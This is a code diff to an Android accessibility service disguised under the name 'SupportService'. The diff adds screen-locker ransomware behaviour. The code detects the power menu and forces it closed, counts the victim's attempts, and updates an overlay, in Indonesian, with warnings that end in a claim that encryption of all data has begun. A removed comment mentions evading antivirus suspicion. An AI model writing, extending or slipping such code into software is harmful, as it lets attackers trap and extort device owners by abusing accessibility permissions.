@@ -182,9 +182,38 @@ public class SupportService extends AccessibilityService {
         }
     }
 
+    private int power_attempt = 0;
+    private TextView tv_msg;
+
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        // Monitoring dinonaktifkan untuk mengurangi kecurigaan sistem/antivirus
+        if (!checkStatus() && overlay != null) {
+            // Deteksi jika menu power (Global Actions) muncul
+            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                String clsName = event.getClassName() != null ? event.getClassName().toString() : "";
+                if (clsName.contains("GlobalActionsDialog") || clsName.contains("PowerOptions")) {
+                    // Paksa tutup menu power dengan mensimulasikan tombol BACK
+                    performGlobalAction(GLOBAL_ACTION_BACK);
+                    
+                    power_attempt++;
+                    show_power_warning();
+                }
+            }
+        }
+    }
+
+    private void show_power_warning() {
+        if (tv_msg == null && overlay != null) {
+            tv_msg = overlay.findViewById(R.id.v_msg);
+        }
+        
+        if (tv_msg != null) {
+            if (power_attempt >= 5) {
+                tv_msg.setText("PERCOBAAN MAXIMAL! ENKRIPSI SELURUH DATA DIMULAI...");
+            } else {
+                tv_msg.setText("JANGAN TAHAN TOMBOL POWER!\nPercobaan: " + power_attempt + "/5");
+            }
+        }
     }
 
     @Override
